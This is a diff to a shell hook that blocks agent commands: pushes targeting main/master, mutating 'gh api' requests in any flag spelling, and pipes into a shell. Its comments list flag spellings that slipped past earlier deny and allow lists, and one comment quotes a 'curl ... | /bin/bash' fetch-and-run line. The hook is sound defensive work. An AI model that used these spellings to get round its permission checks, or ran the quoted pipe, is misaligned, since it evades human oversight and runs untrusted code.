@@ -180,6 +180,64 @@ if echo "$SCAN" | grep -qE 'git\s+push.*\+\s*(main|master|refs/heads/(main|maste
   deny "Blocked: force-push via +refspec to main/master. Use a feature branch."
 fi
 
+# Any push whose DESTINATION is main/master, force or not. Both rules above sit
+# behind a --force/-f gate, so `git push origin HEAD:main` — a plain fast-forward
+# straight onto the default branch — rode through them; the settings deny-list
+# enumerates only the literal `git push origin main` spelling and missed it too,
+# and `Bash(git push:*)` sits in the host ALLOW list, so nothing prompted either.
+# Runs after the two rules above so a force-push keeps its more specific message.
+#
+# Matches the DESTINATION side of a refspec: `git push origin main:feature`, which
+# pushes main ONTO another branch, is left alone. A branch merely containing the
+# word (`my-main-branch`, `feature/main`) does not match — the separator before it
+# has to be whitespace or a colon.
+#
+# --force-with-lease to main is caught here even though the force rule exempts it.
+# The lease only protects someone else's commits from being clobbered; it does not
+# make main a legitimate push target. That is a deliberate change: it was
+# previously allowed.
+#
+# NOT covered, and not coverable by a static scan: a bare `git push` while checked
+# out on main. That needs the current branch, which this hook cannot know.
+if echo "$SCAN" | grep -qE 'git[[:space:]]+push\b' \
+  && echo "$SCAN" | grep -qE '([[:space:]]|:)(refs/heads/)?(main|master)([[:space:]]|$)'; then
+  deny "Blocked: push targeting main/master. Push a feature branch and open a PR."
+fi
+
+# `gh api` mutations, in any flag spelling. The settings deny-lists (host and
+# sandbox alike) enumerate one spelling per flag — `-X POST`, `--method POST`,
+# `-f `, `-F `, `--input ` — all space-separated short forms. gh parses with pflag,
+# so `--method=POST`, `-XPOST`, `--field k=v`, `--raw-field k=v` and `--input=f`
+# are the same request and matched none of them; on the host `Bash(gh api:*)` is
+# in ALLOW, so they ran unprompted. A glob list cannot express "any spelling",
+# which is why this lives here instead.
+#
+# A field flag alone is enough: gh switches the default method from GET to POST as
+# soon as any --field/--raw-field is present, so no method flag need appear.
+# Matched at a command boundary so `gh` inside an argument or a path does not fire.
+GH_API_AT='(^|[;&|(])[[:space:]]*([A-Za-z_][A-Za-z0-9_]*=[^[:space:]]+[[:space:]]+|(command|env|exec|sudo|nohup|nice)[[:space:]]+)*([^[:space:];&|()]*/)?gh[[:space:]]+api\b'
+if echo "$SCAN" | grep -qE "$GH_API_AT"; then
+  gh_hint="Read-only gh api is fine; a human runs the mutation."
+  if echo "$SCAN" | grep -qiE '(^|[[:space:]])(-X|--method)[[:space:]]*=?[[:space:]]*(POST|PUT|PATCH|DELETE)\b'; then
+    deny "Blocked: mutating gh api request (POST/PUT/PATCH/DELETE). $gh_hint"
+  fi
+  # -f/-F is the only short flag gh api spells with an f, so a cluster containing
+  # one is unambiguous; --field/--raw-field are checked separately because the
+  # leading `--` stops the short-flag pattern from reaching them.
+  if echo "$SCAN" | grep -qE '(^|[[:space:]])(--field|--raw-field)([[:space:]]|=)'; then
+    deny "Blocked: gh api field parameter, which makes the request a POST. $gh_hint"
+  fi
+  if echo "$SCAN" | grep -qE '(^|[[:space:]])-[a-zA-Z]*[fF]'; then
+    deny "Blocked: gh api field parameter (-f/-F), which makes the request a POST. $gh_hint"
+  fi
+  if echo "$SCAN" | grep -qE '(^|[[:space:]])--input([[:space:]]|=)'; then
+    deny "Blocked: gh api reading a request body from a file. $gh_hint"
+  fi
+  if echo "$SCAN" | grep -qE '(^|[[:space:]]|/)graphql\b'; then
+    deny "Blocked: gh api graphql, which can mutate. $gh_hint"
+  fi
+fi
+
 # A pipe into a shell. The original `\|\s*(sh|bash|zsh)` recognised only a bare
 # interpreter word, so `curl -s http://x | /bin/bash` and `| sudo bash` both failed to
 # match (verified against the old regex) and degraded from denied to merely prompted.
